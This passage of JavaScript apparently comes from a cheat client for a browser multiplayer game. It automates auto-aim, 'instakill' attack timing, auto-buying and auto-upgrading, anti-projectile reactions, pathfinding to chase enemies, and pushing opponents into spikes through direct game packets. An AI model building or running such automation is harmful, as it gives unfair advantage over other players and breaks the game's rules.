                            my.autoAim = false;
                            packet("f", undefined, 1);
                        }, 1);
                    }, 1);
                }, 1);
            };
            this.gotoGoal = function(goto, OT) {
                let slowDists = (weeeee) => weeeee * config.playerScale;
                let goal = {
                    a: goto - OT,
                    b: goto + OT,
                    c: goto - slowDists(1),
                    d: goto + slowDists(1),
                    e: goto - slowDists(2),
                    f: goto + slowDists(2),
                    g: goto - slowDists(4),
                    h: goto + slowDists(4)
                };
                let bQ = function(wwww, awwww) {
                    if (player.y2 >= config.mapScale / 2 - config.riverWidth / 2 && player.y2 <= config.mapScale / 2 + config.riverWidth / 2 && awwww == 0) {
                        buyEquip(31, 0);
                    } else {
                        buyEquip(wwww, awwww);
                    }
                }
                if (enemy.length) {
                    let dst = near.dist2;
                    this.ticking = true;
                    if (dst >= goal.a && dst <= goal.b) {
                        bQ(22, 0);
                        bQ(11, 1);
                        if (player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0] || player.buildIndex > -1) {
                            selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
                        }
                        return {
                            dir: undefined,
                            action: 1
                        };
                    } else {
                        if (dst < goal.a) {
                            if (dst >= goal.g) {
                                if (dst >= goal.e) {
                                    if (dst >= goal.c) {
                                        bQ(40, 0);
                                        bQ(10, 1);
                                        if (configs.none) {
                                            player.buildIndex != player.items[1] && selectToBuild(player.items[1]);
                                        } else {
                                            if ((player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]) || player.buildIndex > -1) {
                                                selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
                                            }
                                        }
                                    } else {
                                        bQ(22, 0);
                                        bQ(19, 1);
                                        if ((player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]) || player.buildIndex > -1) {
                                            selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
                                        }
                                    }
                                } else {
                                    bQ(6, 0);
                                    bQ(12, 1);
                                    if ((player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]) || player.buildIndex > -1) {
                                        selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
                                    }
                                }
                            } else {
                                biomeGear();
                                bQ(11, 1);
                                if ((player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]) || player.buildIndex > -1) {
                                    selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
                                }
                            }
                            return {
                                dir: near.aim2 + Math.PI,
                                action: 0
                            };
                        } else if (dst > goal.b) {
                            if (dst <= goal.h) {
                                if (dst <= goal.f) {
                                    if (dst <= goal.d) {
                                        bQ(40, 0);
                                        bQ(9, 1);
                                        if (configs.none) {
                                            player.buildIndex != player.items[1] && selectToBuild(player.items[1]);
                                        } else {
                                            if ((player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]) || player.buildIndex > -1) {
                                                selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
                                            }
                                        }
                                    } else {
                                        bQ(22, 0);
                                        bQ(19, 1);
                                        if ((player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]) || player.buildIndex > -1) {
                                            selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
                                        }
                                    }
                                } else {
                                    bQ(6, 0);
                                    bQ(12, 1);
                                    if ((player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]) || player.buildIndex > -1) {
                                        selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
                                    }
                                }
                            } else {
                                biomeGear();
                                bQ(11, 1);
                                if ((player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]) || player.buildIndex > -1) {
                                    selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
                                }
                            }
                            return {
                                dir: near.aim2,
                                action: 0
                            };
                        }
                        return {
                            dir: undefined,
                            action: 0
                        };
                    }
                } else {
                    this.ticking = false;
                    return {
                        dir: undefined,
                        action: 0
                    };
                }
            }
            /** wait 1 tick for better quality */
            this.bowMovement = function() {
                let moveMent = this.gotoGoal(685, 3);
                if (moveMent.action) {
                    if (player.reloads[53] == 0 && !this.isTrue) {
                        this.rangeType("ageInsta");
                    } else {
                        packet("f", moveMent.dir, 1);
                    }
                } else {
                    packet("f", moveMent.dir, 1);
                }
            },
                this.tickMovement = function() {
                let dist = player.weapons[1] == 9 ? 240 : 240;
                let actionDist = player.weapons[1] == 9 ? 2 : player.weapons[1] == 12 ? 1.5 : player.weapons[1] == 13 ? 1 : player.weapons[1] == 15 ? 2 : 3;
                let moveMent = this.gotoGoal(238, 3);
                if (moveMent.action) {
                    if (player.reloads[53] == 0 && !this.isTrue) {
                        this.boostTickType();
                    } else {
                        packet("f", moveMent.dir, 1);
                    }
                } else {
                    packet("f", moveMent.dir, 1);
                }
            },
                this.kmTickMovement = function() {
                let moveMent = this.gotoGoal(240, 3);
                if (moveMent.action) {
                    if (near.skinIndex != 22 && player.reloads[53] == 0 && !this.isTrue && ((game.tick - near.poisonTick) % config.serverUpdateRate == 8)) {
                        this.kmTickType();
                    } else {
                        packet("f", moveMent.dir, 1);
                    }
                } else {
                    packet("f", moveMent.dir, 1);
                }
            },
                this.boostTickMovement = function() {
                let dist = player.weapons[1] == 9 ? 365 : player.weapons[1] == 12 ? 380 : player.weapons[1] == 13 ? 365 : player.weapons[1] == 15 ? 365 : 370;
                let actionDist = player.weapons[1] == 9 ? 2 : player.weapons[1] == 12 ? 1.5 : player.weapons[1] == 13 ? 1 : player.weapons[1] == 15 ? 2 : 3;
                let moveMent = this.gotoGoal(372, 3);
                if (moveMent.action) {
                    if (player.reloads[53] == 0 && !this.isTrue) {
                        this.boostTickType();
                    } else {
                        packet("f", moveMent.dir, 1);
                    }
                } else {
                    packet("f", moveMent.dir, 1);
                }
            }
            /** wait 1 tick for better quality */
            this.perfCheck = function(pl, nr) {
                if (nr.weaponIndex == 11 && UTILS.getAngleDist(nr.aim2 + Math.PI, nr.d2) <= config.shieldAngle) return false;
                if (![9, 12, 13, 15].includes(player.weapons[1])) return true;
                let pjs = {
                    x: nr.x2 + (65 * Math.cos(nr.aim2 + Math.PI)),
                    y: nr.y2 + (65 * Math.sin(nr.aim2 + Math.PI))
                };
                if (UTILS.lineInRect(pl.x2 - pl.scale, pl.y2 - pl.scale, pl.x2 + pl.scale, pl.y2 + pl.scale, pjs.x, pjs.y, pjs.x, pjs.y)) {
                    return true;
                }
                let finds = ais.filter(tmp => tmp.visible).find((tmp) => {
                    if (UTILS.lineInRect(tmp.x2 - tmp.scale, tmp.y2 - tmp.scale, tmp.x2 + tmp.scale, tmp.y2 + tmp.scale, pjs.x, pjs.y, pjs.x, pjs.y)) {
                        return true;
                    }
                });
                if (finds) return false;
                finds = liztobj.filter(tmp => tmp.active).find((tmp) => {
                    let tmpScale = tmp.getScale();
                    if (!tmp.ignoreCollision && UTILS.lineInRect(tmp.x - tmpScale, tmp.y - tmpScale, tmp.x + tmpScale, tmp.y + tmpScale, pjs.x, pjs.y, pjs.x, pjs.y)) {
                        return true;
                    }
                });
                if (finds) return false;
                return true;
            }
        }
    };
    class Autobuy {
        constructor(buyHat, buyAcc) {
            this.hat = function() {
                buyHat.forEach((id) => {
                    let find = findID(hats, id);
                    if (find && !player.skins[id] && player.points >= find.price) packet("c", 1, id, 0);
                });
            };
            this.acc = function() {
                buyAcc.forEach((id) => {
                    let find = findID(accessories, id);
                    if (find && !player.tails[id] && player.points >= find.price) packet("c", 1, id, 1);
                });
            };
        }
    };

    class Autoupgrade {
        constructor() {
            this.sb = function(upg) {
                upg(3);
                upg(17);
                upg(31);
                upg(23);
                upg(9);
                upg(38);
            };
            this.kh = function(upg) {
                upg(3);
                upg(17);
                upg(31);
                upg(23);
                upg(10);
                upg(38);
                upg(4);
                upg(25);
            };
            this.pb = function(upg) {
                upg(5);
                upg(17);
                upg(32);
                upg(23);
                upg(9);
                upg(38);
            };
            this.ph = function(upg) {
                upg(5);
                upg(17);
                upg(32);
                upg(23);
                upg(10);
                upg(38);
                upg(28);
                upg(25);
            };
            this.db = function(upg) {
                upg(7);
                upg(17);
                upg(31);
                upg(23);
                upg(9);
                upg(34);
            };
        };
    };

    class Damages {
        constructor(items) {
            // 0.75 1 1.125 1.5
            this.calcDmg = function(dmg, val) {
                return dmg * val;
            };
            this.getAllDamage = function(dmg) {
                return [this.calcDmg(dmg, 0.75), dmg, this.calcDmg(dmg, 1.125), this.calcDmg(dmg, 1.5)];
            };
            this.weapons = [];
            for (let i = 0; i < items.weapons.length; i++) {
                let wp = items.weapons[i];
                let name = wp.name.split(" ").length <= 1 ? wp.name : (wp.name.split(" ")[0] + "_" + wp.name.split(" ")[1]);
                this.weapons.push(this.getAllDamage(i > 8 ? wp.Pdmg : wp.dmg));
                this[name] = this.weapons[i];
            }
        }
    }

    /** CLASS CODES */
    // jumpscare code warn
    let tmpList = [];
    var bianosTick = false;


    // LOADING:
    let UTILS = new Utils();
    let items = new Items();
    let objectManager = new Objectmanager(GameObject, gameObjects, UTILS, config);
    let store = new Store();
    let hats = store.hats;
    let accessories = store.accessories;
    let projectileManager = new ProjectileManager(Projectile, projectiles, players, ais, objectManager, items, config, UTILS);
    let aiManager = new AiManager(ais, AI, players, items, null, config, UTILS);
    let textManager = new Textmanager();

    let traps = new Traps(UTILS, items);
    let instaC = new Instakill();
    let autoBuy = new Autobuy([6,7, 22, 12, 53, 40], [11 , 13, 19]);
    let autoUpgrade = new Autoupgrade();

    let lastDeath;
    let minimapData;
    let mapMarker = {};
    let mapPings = [];
    let tmpPing;

    let breakTrackers = [];

    let pathFindTest = 0;
    let grid = [];
    let pathFind = {
        active: false,
        grid: 40,
        scale: 1440,
        x: 14400,
        y: 14400,
        chaseNear: false,
        array: [],
        lastX: this.grid / 2,
        lastY: this.grid / 2
    };

    function sendChat(message) {
        packet("6", message.slice(0, 30));
    }

    let runAtNextTick = [];

    function checkProjectileHolder(x, y, dir, range, speed, indx, layer, sid) {
        let weaponIndx = indx == 0 ? 9 : indx == 2 ? 12 : indx == 3 ? 13 : indx == 5 && 15;
        let projOffset = config.playerScale * 2;
        let projXY = {
            x: indx == 1 ? x : x - projOffset * Math.cos(dir),
            y: indx == 1 ? y : y - projOffset * Math.sin(dir),
        };
        let nearPlayer = players.filter((e) => e.visible && UTILS.getDist(projXY, e, 0, 2) <= e.scale).sort(function(a, b) {
            return UTILS.getDist(projXY, a, 0, 2) - UTILS.getDist(projXY, b, 0, 2);
        })[0];
        if (nearPlayer) {
            if (indx == 1) {
                nearPlayer.shooting[53] = 1;
            } else {
                nearPlayer.shootIndex = weaponIndx;
                nearPlayer.shooting[1] = 1;
                antiProj(nearPlayer, dir, range, speed, indx, weaponIndx);
            }
        }
    }
    let projectileCount = 0;

    function antiProj(tmpObj, dir, range, speed, index, weaponIndex) {
        if (!tmpObj.isTeam(player)) {
            tmpDir = UTILS.getDirect(player, tmpObj, 2, 2);
            if (UTILS.getAngleDist(tmpDir, dir) <= 0.2) {
                tmpObj.bowThreat[weaponIndex]++;
                if (index == 5) {
                    projectileCount++;
                }
                setTimeout(() => {
                    tmpObj.bowThreat[weaponIndex]--;
                    if (index == 5) {
                        projectileCount--;
                    }
                }, range / speed);
                if (tmpObj.bowThreat[9] >= 1 && (tmpObj.bowThreat[12] >= 1 || tmpObj.bowThreat[15] >= 1)) {
                    place(1, tmpObj.aim2);
                    my.anti0Tick = 4;
                    if (!my.antiSync) {
                        antiSyncHealing(4);
                    }
                } else {
                    if (projectileCount >= 2) {
                        place(1, tmpObj.aim2);
                        my.anti0Tick = 4;
                        if (!my.antiSync) {
                            antiSyncHealing(4);
                        }
                    }
                }
            }
        }
    }

    // SHOW ITEM INFO:
    function showItemInfo(item, isWeapon, isStoreItem) {
        if (player && item) {
            UTILS.removeAllChildren(itemInfoHolder);
            itemInfoHolder.classList.add("visible");
            UTILS.generateElement({
                id: "itemInfoName",
                text: UTILS.capitalizeFirst(item.name),
                parent: itemInfoHolder
            });
            UTILS.generateElement({
                id: "itemInfoDesc",
                text: item.desc,
                parent: itemInfoHolder
            });
            if (isStoreItem) {

            } else if (isWeapon) {
                UTILS.generateElement({
                    class: "itemInfoReq",
                    text: !item.type ? "primary" : "secondary",
                    parent: itemInfoHolder
                });
            } else {
                for (let i = 0; i < item.req.length; i += 2) {
                    UTILS.generateElement({
                        class: "itemInfoReq",
                        html: item.req[i] + "<span class='itemInfoReqVal'> x" + item.req[i + 1] + "</span>",
                        parent: itemInfoHolder
                    });
                }
                if (item.group.limit) {
                    UTILS.generateElement({
                        class: "itemInfoLmt",
                        text: (player.itemCounts[item.group.id] || 0) + "/" + (config.isSandbox ? 99 : item.group.limit),
                        parent: itemInfoHolder
                    });
                }
            }
        } else {
            itemInfoHolder.classList.remove("visible");
        }
    }


    // RESIZE:
    window.addEventListener("resize", UTILS.checkTrusted(resize));

    function resize() {
        screenWidth = window.innerWidth;
        screenHeight = window.innerHeight;
        let scaleFillNative = Math.max(screenWidth / maxScreenWidth, screenHeight / maxScreenHeight) * pixelDensity;
        gameCanvas.width = screenWidth * pixelDensity;
        gameCanvas.height = screenHeight * pixelDensity;
        gameCanvas.style.width = screenWidth + "px";
        gameCanvas.style.height = screenHeight + "px";
        mainContext.setTransform(
            scaleFillNative, 0,
            0, scaleFillNative,
            (screenWidth * pixelDensity - (maxScreenWidth * scaleFillNative)) / 2,
            (screenHeight * pixelDensity - (maxScreenHeight * scaleFillNative)) / 2
        );
    }
    resize();

    // MOUSE INPUT:
    var usingTouch;
    const mals = document.getElementById('touch-controls-fullscreen');
    mals.style.display = 'block';
    mals.addEventListener("mousemove", gameInput, false);

    function gameInput(e) {
        mouseX = e.clientX;
        mouseY = e.clientY;
    }
    let clicks = {
        left: false,
        middle: false,
        right: false,
    };
    let clicked = {
        g: false
    }
    mals.addEventListener("mousedown", mouseDown, false);

    function mouseDown(e) {
        if (attackState != 1) {
            attackState = 1;
            if (e.button == 0) {
                clicks.left = true;
            } else if (e.button == 2) {
                clicks.right = true;
            }
        }
    }
    mals.addEventListener("mouseup", UTILS.checkTrusted(mouseUp));

    function mouseUp(e) {
        if (attackState != 0) {
            attackState = 0;
            if (e.button == 0) {
                clicks.left = false;
            } else if (e.button == 1) {
                clicks.middle = false;
            } else if (e.button == 2) {
                clicks.right = false;
            }
        }
    }
    mals.addEventListener("wheel", wheel, false);

    function wheel(e) {
        if (e.deltaY < 0) {
            wbe += 0.005
            maxScreenWidth = config.maxScreenWidth * wbe;
            maxScreenHeight = config.maxScreenHeight * wbe;
            resize()
        } else {
            wbe -= 0.005
            maxScreenWidth = config.maxScreenWidth * wbe;
            maxScreenHeight = config.maxScreenHeight * wbe;
            resize()
        }
    }

    // INPUT UTILS:
    function getMoveDir() {
        let dx = 0;
        let dy = 0;
        for (let key in moveKeys) {
            let tmpDir = moveKeys[key];
            dx += !!keys[key] * tmpDir[0];
            dy += !!keys[key] * tmpDir[1];
        }
        return dx == 0 && dy == 0 ? undefined : Math.atan2(dy, dx);
    }

    function getSafeDir() {
        if (!player)
            return 0;
        if (!player.lockDir) {
            lastDir = Math.atan2(mouseY - (screenHeight / 2), mouseX - (screenWidth / 2));
        }
        return lastDir || 0;
    }
    let plusDir = 0;
    let lastSpin = Date.now();
    function getAttackDir(debug) {
        if (debug) {
            if (!player)
                return "0";
            if (my.autoAim || ((clicks.left || (useWasd && near.dist2 <= items.weapons[player.weapons[0]].range + near.scale * 1.8 && !traps.inTrap)) && player.reloads[player.weapons[0]] == 0))
                lastDir = getEl("weaponGrind").checked ? "getSafeDir()" : enemy.length ? my.revAim ? "(near.aim2 + Math.PI)" : "near.aim2" : "getSafeDir()";
            else
                if (clicks.right && player.reloads[player.weapons[1] == 10 ? player.weapons[1] : player.weapons[0]] == 0)
                    lastDir = "getSafeDir()";
            else
                if (traps.inTrap && player.reloads[traps.notFast() ? player.weapons[1] : player.weapons[0]] == 0)
                    lastDir = "traps.aim";
            else
                if (!player.lockDir) {
                    if (configs.noDir) return "undefined";
                    lastDir = "getSafeDir()";
                }
            return lastDir;
        } else {
            if (!player)
                return 0;
            if (my.autoAim || ((clicks.left || (useWasd && near.dist2 <= items.weapons[player.weapons[0]].range + near.scale * 1.8 && !traps.inTrap)) && player.reloads[player.weapons[0]] == 0))
                lastDir = getEl("weaponGrind").checked ? getSafeDir() : enemy.length ? my.revAim ? (near.aim2 + Math.PI) : near.aim2 : getSafeDir();
            else
                if (clicks.right && player.reloads[player.weapons[1] == 10 ? player.weapons[1] : player.weapons[0]] == 0)
                    lastDir = getSafeDir();
            else
                if (traps.inTrap && player.reloads[traps.notFast() ? player.weapons[1] : player.weapons[0]] == 0)
                    lastDir = traps.aim;
            else
                if (!player.lockDir) {
                    if (configs.noDir) return undefined;
                    lastDir = getSafeDir();
                }
            return lastDir || 0;
        }
    }

    function getVisualDir() {
        if (!player)
            return 0;
        lastDir = getSafeDir();
        return lastDir || 0;
    }

    // KEYS:
    function keysActive() {
        return (allianceMenu.style.display != "block" &&
                chatHolder.style.display != "block" &&
                !menuCBFocus);
    }

    function toggleMenuChat() {
        if (menuChatDiv.style.display != "none") {
            //   chatHolder.style.display = "none";
            // if (menuChatBox.value != "") {
            //commands[command.slice(1)]
            let cmd = function(command) {
                return {
                    found: command.startsWith("/") && commands[command.slice(1).split(" ")[0]],
                    fv: commands[command.slice(1).split(" ")[0]]
                }
            }
            let command = cmd(menuChatBox.value);
            if (command.found) {
                if (typeof command.fv.action === "function") {
                    command.fv.action(menuChatBox.value);
                }
            } else {
                sendChat(menuChatBox.value);
            }
            menuChatBox.value = "";
            menuChatBox.blur();
        } else {
            if (menuCBFocus) {
                menuChatBox.blur();
            } else {
                menuChatBox.focus();
            }
        }
    }

    function keyDown(event) {
        let keyNum = event.which || event.keyCode || 0;
        if (player && player.alive && keysActive()) {
            if (!keys[keyNum]) {
                keys[keyNum] = 1;
                macro[event.key] = 1;
                if (keyNum == 27) {
                    openMenu = !openMenu;
                    $("#menuDiv").toggle();
                } else if (keyNum == 69) {
                    sendAutoGather();
                } else if (keyNum == 67) {
                    updateMapMarker();
                } else if (keyNum == 71) {
                    clicked.g = !clicked.g
                } else if (player.weapons[keyNum - 49] != undefined) {
                    player.weaponCode = player.weapons[keyNum - 49];
                } else if (moveKeys[keyNum]) {
                    sendMoveDir();
                } else if (event.key == "m") {
                    mills.placeSpawnPads = !mills.placeSpawnPads;
                } else if (event.key == "z") {
                    mills.place = !mills.place;
                } else if (event.key == "Z") {
                    typeof window.debug == "function" && window.debug();
                } else if (keyNum == 32) {
                    packet("F", 1, getSafeDir(), 1);
                    packet("F", 0, getSafeDir(), 1);
                }
            }
        }
    }
    addEventListener("keydown", UTILS.checkTrusted(keyDown));

    function keyUp(event) {
        if (player && player.alive) {
            let keyNum = event.which || event.keyCode || 0;
            if (keyNum == 13) {
                toggleMenuChat();
            } else if (keysActive()) {
                if (keys[keyNum]) {
                    keys[keyNum] = 0;
                    macro[event.key] = 0;
                    if (moveKeys[keyNum]) {
                        sendMoveDir();
                    }
                }
            }
        }
    }
    window.addEventListener("keyup", UTILS.checkTrusted(keyUp));

    function sendMoveDir() {
        let newMoveDir = getMoveDir();
        if (lastMoveDir == undefined || newMoveDir == undefined || Math.abs(newMoveDir - lastMoveDir) > 0.3) {
            if (!my.autoPush) {
                packet("f", newMoveDir, 1);
            }
            lastMoveDir = newMoveDir;
        }
    }

    // BUTTON EVENTS:
    function bindEvents() {}
    bindEvents();

    /** PATHFIND TEST */
    function chechPathColl(tmp) {
        return ((player.scale + tmp.getScale()) / (player.maxSpeed * items.weapons[player.weaponIndex].spdMult)) + (tmp.dmg && !tmp.isTeamObject(player) ? 35 : 0);
        return tmp.colDiv == 0.5 ? (tmp.scale * tmp.colDiv) :
            !tmp.isTeamObject(player) && tmp.dmg ? (tmp.scale + player.scale) :
        tmp.isTeamObject(player) && tmp.trap ? 0 : tmp.scale;
    }

    function checkObject() {
        let checkColl = gameObjects.filter(tmp => player.canSee(tmp) && tmp.active);
        for (let y = 0; y < pathFind.grid; y++) {
            grid[y] = [];
            for (let x = 0; x < pathFind.grid; x++) {
                let tmpXY = {
                    x: (player.x2 - (pathFind.scale / 2)) + ((pathFind.scale / pathFind.grid) * x),
                    y: (player.y2 - (pathFind.scale / 2)) + ((pathFind.scale / pathFind.grid) * y)
                }
                if (UTILS.getDist(pathFind.chaseNear ? near : pathFind, tmpXY, pathFind.chaseNear ? 2 : 0, 0) <= (pathFind.chaseNear ? 35 : 60)) {
                    pathFind.lastX = x;
                    pathFind.lastY = y;
                    grid[y][x] = 0;
                    continue;
                }
                let find = checkColl.find(tmp => UTILS.getDist(tmp, tmpXY, 0, 0) <= chechPathColl(tmp));
                if (find) {
                    if (find.trap) {
                        grid[y][x] = 0;
                        continue;
                    }
                    grid[y][x] = 1;
                } else {
                    grid[y][x] = 0;
                }
            }
        }
    }

    function createPath() {
        grid = [];
        checkObject();
    }

    function Pathfinder() {
        pathFind.scale = (config.maxScreenWidth / 2) * 1.3;
        if (!traps.inTrap && (pathFind.chaseNear ? enemy.length : true)) {
            if (near.dist2 <= items.weapons[player.weapons[0]].range) {
                packet("f", undefined, 1);
            } else {
                createPath();
                easystar.setGrid(grid);
                easystar.setAcceptableTiles([0]);
                easystar.enableDiagonals();
                easystar.findPath((grid[0].length / 2), (grid.length / 2), pathFind.lastX, pathFind.lastY, function (path) {
                    if (path === null) {
                        pathFind.array = [];
                        if (near.dist2 <= items.weapons[player.weapons[0]].range) {
                            packet("f", undefined, 1);
                        } else {
                            packet("f", near.aim2, 1);
                        }
                    } else {
                        pathFind.array = path;
                        if (pathFind.array.length > 1) {
                            let tmpXY = {
                                x: (player.x2 - (pathFind.scale / 2)) + ((pathFind.scale / pathFind.grid) * path[1].x),
                                y: (player.y2 - (pathFind.scale / 2)) + ((pathFind.scale / pathFind.grid) * path[1].y)
                            }
                            packet("f", UTILS.getDirect(tmpXY, player, 0, 2), 1);
                        }
                    }
                });
                easystar.calculate();
            }
        }
    }
    /** PATHFIND TEST */

    // ITEM COUNT DISPLAY:
    let isItemSetted = [];

    function updateItemCountDisplay(index = undefined) {
        for (let i = 3; i < items.list.length; ++i) {
            let id = items.list[i].group.id;
            let tmpI = items.weapons.length + i;
            if (!isItemSetted[tmpI]) {
                isItemSetted[tmpI] = document.createElement("div");
                isItemSetted[tmpI].id = "itemCount" + tmpI;
                getEl("actionBarItem" + tmpI).appendChild(isItemSetted[tmpI]);
                isItemSetted[tmpI].style = `
                        display: block;
                        position: absolute;
                        padding-left: 5px;
                        font-size: 2em;
                        color: #fff;
                        `;
                isItemSetted[tmpI].innerHTML = player.itemCounts[id] || 0;
            } else {
                if (index == id) isItemSetted[tmpI].innerHTML = player.itemCounts[index] || 0;
            }
        }
    }

    // AUTOPUSH:
    function autoPush() {
        let nearTrap = gameObjects.filter(tmp => tmp.trap && tmp.active && tmp.isTeamObject(player) && UTILS.getDist(tmp, near, 0, 2) <= (near.scale + tmp.getScale() + 5)).sort(function(a, b) {
            return UTILS.getDist(a, near, 0, 2) - UTILS.getDist(b, near, 0, 2);
        })[0];
        if (nearTrap) {
            let spike = gameObjects.filter(tmp => tmp.dmg && tmp.active && tmp.isTeamObject(player) && UTILS.getDist(tmp, nearTrap, 0, 0) <= (near.scale + nearTrap.scale + tmp.scale)).sort(function(a, b) {
                return UTILS.getDist(a, near, 0, 2) - UTILS.getDist(b, near, 0, 2);
            })[0];
            if (spike) {
                let pushAngle = Math.atan2(near.y2 - spike.y, near.x2 - spike.x)

                /*let pos = {
                            x: spike.x + (250 * Math.cos(UTILS.getDirect(near, spike, 2, 0))),
                            y: spike.y + (250 * Math.sin(UTILS.getDirect(near, spike, 2, 0))),
                            x2: spike.x + ((UTILS.getDist(near, spike, 2, 0) + player.scale) * Math.cos(UTILS.getDirect(near, spike, 2, 0))) + Math.cos(25),
                            y2: spike.y + ((UTILS.getDist(near, spike, 2, 0) + player.scale) * Math.sin(UTILS.getDirect(near, spike, 2, 0))) + Math.sin(25)
                        };
                        let finds = gameObjects.filter(tmp => tmp.active).find((tmp) => {
                            let tmpScale = tmp.getScale();
                            if (!tmp.ignoreCollision && UTILS.lineInRect(tmp.x - tmpScale, tmp.y - tmpScale, tmp.x + tmpScale, tmp.y + tmpScale, player.x2, player.y2, pos.x2, pos.y2)) {
                                return true;
                            }
                        });
                        if (finds) {
                            if (my.autoPush) {
                                my.autoPush = false;
                                packet("f", lastMoveDir || undefined, 1);
                            }
                        } else {*/
                my.autoPush = true;
                sendChat("");
                my.pushData = {
                    x: spike.x + Math.cos(pushAngle),
                    y: spike.y + Math.sin(pushAngle),
                    x2: player.x2+30,
                    y2: player.y2+30
                };

                let point = {
                    x: near.x2 + Math.cos(pushAngle) * 30,
                    y: near.y2 + Math.sin(pushAngle) * 60,
                }

                let dir = Math.atan2(point.y - player.y2, point.x - player.x2)

                packet("f", dir, 1)
                /*let scale = (player.scale / 10);
                            if (UTILS.lineInRect(player.x2 - scale, player.y2 - scale, player.x2 + scale, player.y2 + scale, near.x2, near.y2, pos.x, pos.y)) {
                                packet("f", near.aim2, 1);
                            } else {
                                packet("f", UTILS.getDirect(pos, player, 2, 2), 1);
                            }*/
                //}
            } else {
                if (my.autoPush) {
                    my.autoPush = false;
                    packet("f", lastMoveDir || undefined, 1);
                }
            }
        } else {
            if (my.autoPush) {
                my.autoPush = false;
                packet("f", lastMoveDir || undefined, 1);
            }
        }
    }


    class AutoPush {
        socket = null;

        findIntersect(vec, vec1, vec2) {
            // Find point of vec1 and vec2 intersection
            const delta = Math.hypot(vec1.x - vec2.x, vec1.y - vec2.y) / 2;
            const tang = Math.tan((vec1.y - vec2.y) / (vec1.x - vec2.x));
            const vec3x = Math.cos(tang) * delta;
            const vec3y = Math.sin(tang) * delta;
            // Find angle from vec to vec3
            const theta = Math.tan((vec.y - vec3y) / (vec.x - vec3x));

            return theta;
        };

        pushEnemy(player, enemy, spike) {
            const angle = this.findIntersect(enemy, spike, player);
            const dist = Math.hypot(player.x - enemy.x, player.y - enemy.y);

            if (dist > 180) return;

            this.socket.send("f", angle);
        };

        constructor(socket) {
            this.socket = socket;
        }
    }

    // ADD DEAD PLAYER:
    function addDeadPlayer(tmpObj) {
        deadPlayers.push(new DeadPlayer(tmpObj.x, tmpObj.y, tmpObj.dir, tmpObj.buildIndex, tmpObj.weaponIndex, tmpObj.weaponVariant, tmpObj.skinColor, tmpObj.scale, tmpObj.name));
    }

    /** APPLY SOCKET CODES */

    // SET INIT DATA:
    function setInitData(data) {
        alliances = data.teams;
    }

    // SETUP GAME:
    function setupGame(yourSID) {
        keys = {};
        macro = {};
        playerSID = yourSID;
        attackState = 0;
        inGame = true;
        packet("F", 0, getAttackDir(), 1);
        my.ageInsta = true;
        if (firstSetup) {
            firstSetup = false;
            gameObjects.length = 0;
            liztobj.length = 0;
        }
    }

    // ADD NEW PLAYER:
    function addPlayer(data, isYou) {
        let tmpPlayer = findPlayerByID(data[0]);
        if (!tmpPlayer) {
            tmpPlayer = new Player(data[0], data[1], config, UTILS, projectileManager,
                                   objectManager, players, ais, items, hats, accessories);
            players.push(tmpPlayer);
            if (data[1] != playerSID) {
                addMenuChText(null, `Found ${data[2]} {${data[1]}}`, "lime");
            }
        } else {
            if (data[1] != playerSID) {
                addMenuChText(null, `Found ${data[2]} {${data[1]}}`, "lime");
            }
        }
        tmpPlayer.spawn(isYou ? true : null);
        tmpPlayer.visible = false;
        tmpPlayer.oldPos = {
            x2: undefined,
            y2: undefined
        };
        tmpPlayer.x2 = undefined;
        tmpPlayer.y2 = undefined;
        tmpPlayer.x3 = undefined;
        tmpPlayer.y3 = undefined;
        tmpPlayer.setData(data);
        if (isYou) {
            if (!player) {
                window.prepareUI(tmpPlayer);
            }
            player = tmpPlayer;
            camX = player.x;
            camY = player.y;
            my.lastDir = 0;
            updateItems();
            updateAge();
            updateItemCountDisplay();
            if (player.skins[7]) {
                my.reSync = true;
            }
        }
    }

    // REMOVE PLAYER:
    function removePlayer(id) {
        for (let i = 0; i < players.length; i++) {
            if (players[i].id == id) {
                addMenuChText("Game", players[i].name + "[" + players[i].sid + "] left the game", "red");
                players.splice(i, 1);
                break;
            }
        }
    }

    // UPDATE HEALTH:
    function updateHealth(sid, value) {
        tmpObj = findPlayerBySID(sid);
        if (tmpObj) {
            tmpObj.oldHealth = tmpObj.health;
            tmpObj.health = value;
            tmpObj.judgeShame();
            if (tmpObj.oldHealth > tmpObj.health) {
                tmpObj.damaged = tmpObj.oldHealth - tmpObj.health;
                advHeal.push([sid, value, tmpObj.damaged]);
            } else {}
            if (tmpObj.health <= 0) {
                /*bots.forEach((hmm) => {
                            hmm.whyDie = tmpObj.name;
                        });*/
            }
        }
    }


    // KILL PLAYER:
    function killPlayer() {
        inGame = false;
        lastDeath = {
            x: player.x,
            y: player.y,
        };
        if (configs.autoRespawn) {
            getEl("diedText").style.display = "none";
            packet("M", {
                name: lastsp[0],
                moofoll: lastsp[1],
                skin: lastsp[2]
            });
        }
    }

    // UPDATE PLAYER ITEM VALUES:
    function updateItemCounts(index, value) {
        if (player) {
            player.itemCounts[index] = value;
            updateItemCountDisplay(index);
        }
    }

    // UPDATE AGE:
    function updateAge(xp, mxp, age) {
        if (xp != undefined)
            player.XP = xp;
        if (mxp != undefined)
            player.maxXP = mxp;
        if (age != undefined)
            player.age = age;
    }

    // UPDATE UPGRADES:
    function updateUpgrades(points, age) {
        player.upgradePoints = points;
